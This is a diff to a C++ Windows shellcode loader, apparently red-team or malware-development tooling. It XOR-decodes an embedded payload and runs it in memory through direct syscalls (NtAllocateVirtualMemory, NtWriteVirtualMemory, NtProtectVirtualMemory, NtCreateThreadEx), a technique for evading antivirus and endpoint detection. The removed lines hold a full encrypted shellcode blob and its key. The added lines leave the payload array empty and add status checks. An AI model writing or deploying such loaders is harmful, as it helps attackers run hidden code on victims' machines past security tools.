@@ -1,44 +1,51 @@
 #include <windows.h>
 #include <iostream>
-#include <tlhelp32.h>
-#include "syscalls_common.h" 
+#include "syscalls_common.h"  
 
-int main(int argc, char** argv) {
-    /////////////////////////////// Shellcode decryption ////////////////////////////// 
-
-    printf("\nDecrypting shellcode\n");
-    char encryptedShellcode[] = "\x90\x3d\xfa\x82\x84\x8c\xac\x75\x79\x66\x35\x35\x2d\x25\x2b\x37\x22\x2c\x5d\xa7\x1c\x2e\xff\x36\x0c\x3d\xf2\x34\x6c\x2c\xe7\x27\x59\x2e\xff\x16\x3c\x3d\x76\xd1\x3e\x2e\x21\x44\xb0\x2e\x45\xa4\xc0\x49\x18\x1a\x76\x48\x4c\x34\xb8\xaf\x79\x25\x6d\xb4\x9b\x8b\x26\x25\x3d\x3d\xf2\x34\x54\xef\x2e\x49\x31\x67\xa4\xef\xec\xfd\x79\x66\x74\x2c\xe9\xb5\x0d\x01\x3c\x65\xbc\x25\xf2\x2e\x6c\x20\xe7\x35\x59\x2f\x75\xb4\x8f\x23\x31\x99\xbd\x25\xe7\x41\xf1\x2e\x75\xb2\x21\x44\xb0\x2e\x45\xa4\xc0\x34\xb8\xaf\x79\x25\x6d\xb4\x41\x86\x01\x95\x20\x76\x35\x42\x7c\x21\x55\xa4\x0c\xbe\x2c\x20\xe7\x35\x5d\x2f\x75\xb4\x0a\x34\xf2\x6a\x3c\x20\xe7\x35\x65\x2f\x75\xb4\x2d\xfe\x7d\xee\x3c\x65\xbc\x34\x21\x27\x2c\x3a\x35\x2f\x38\x3e\x35\x3d\x2d\x2f\x31\xe5\x98\x44\x2d\x27\x86\x86\x2c\x25\x35\x2f\x31\xed\x66\x8d\x3b\x8a\x86\x99\x29\x2c\xd6\x74\x79\x66\x74\x64\x6c\x75\x79\x2e\xf9\xe9\x6d\x74\x79\x66\x35\xde\x5d\xfe\x16\xe1\x8b\xb1\xd7\x85\xcc\xc4\x22\x25\xd6\xd3\xec\xdb\xe9\x9b\xb9\x3d\xfa\xa2\x5c\x58\x6a\x09\x73\xe6\x8f\x84\x19\x70\xc2\x21\x67\x16\x03\x1f\x79\x3f\x35\xed\xb6\x8a\xac\x05\x15\x08\x0f\x5b\x1c\x1e\x11\x64";
-    char key[] = "luyftd";
-    size_t legitrick_len = sizeof(encryptedShellcode);
-
-
-    char encodedlegitrick[sizeof encryptedShellcode];
-
-    int j = 0;
-    for (int i = 0; i < sizeof encryptedShellcode; i++) {
-        if (j == sizeof key - 1) j = 0;
-        encodedlegitrick[i] = encryptedShellcode[i] ^ key[j];
-        j++;
+#define VERIFY_SUCCESS(func, status) \
+    if (status != 0) { \
+        printf("\n[!] %s failed! NTSTATUS: 0x%08X\n", func, status); \
+        return 1; \
     }
-    printf("\nDecrypted.\n\n");
 
-    /////////////////////////////// Shellcode Execution ////////////////////////////// 
+int main() {
+    unsigned char encryptedShellcode[] ="";
+
+    char key[] = "L0c4L!iN7act0r!";
+
+    size_t payloadSize = sizeof(encryptedShellcode) - 1;
+    unsigned char* decoded = (unsigned char*)malloc(payloadSize);
+
+    printf("[*] Decoding payload...\n");
+    for (size_t i = 0; i < payloadSize; i++) {
+        decoded[i] = encryptedShellcode[i] ^ key[i % (sizeof(key) - 1)];
+    }
+
 
     PVOID lpAllocationStart = nullptr;
-    SIZE_T payloadSize = sizeof(encodedlegitrick);
     HANDLE hProcess = GetCurrentProcess();
-    HANDLE hThread;
-    SIZE_T bytesWritten;
-    ULONG oldProtect;
+    HANDLE hThread = NULL;
+    SIZE_T bytesWritten = 0;
+    ULONG oldProtect = 0;
+    NTSTATUS status;
 
-    printf("\nInjecting...\n\n");
+    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    VERIFY_SUCCESS("NtAllocateVirtualMemory", status);
 
-    NtAllocateVirtualMemory(hProcess,&lpAllocationStart,0,&payloadSize,MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
-    NtWriteVirtualMemory(hProcess,lpAllocationStart,encodedlegitrick,payloadSize,&bytesWritten); 
-    NtProtectVirtualMemory(hProcess, &lpAllocationStart, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
-    NtCreateThreadEx(&hThread,GENERIC_EXECUTE,NULL,GetCurrentProcess(),lpAllocationStart,NULL,FALSE,0,0,0,NULL);
+    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, decoded, payloadSize, &bytesWritten);
+    VERIFY_SUCCESS("NtWriteVirtualMemory", status);
+
+    PVOID bAddress = lpAllocationStart;
+    SIZE_T bSize = payloadSize;
+    status = NtProtectVirtualMemory(hProcess, &bAddress, &bSize, PAGE_EXECUTE_READ, &oldProtect);
+    VERIFY_SUCCESS("NtProtectVirtualMemory", status);
+
+    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
+    VERIFY_SUCCESS("NtCreateThreadEx", status);
+
+    printf("[+] Thread spawned. Check WinDbg.\n");
     WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    VirtualFree(lpAllocationStart, 0, MEM_RELEASE);
+
+    free(decoded);
     return 0;
 }
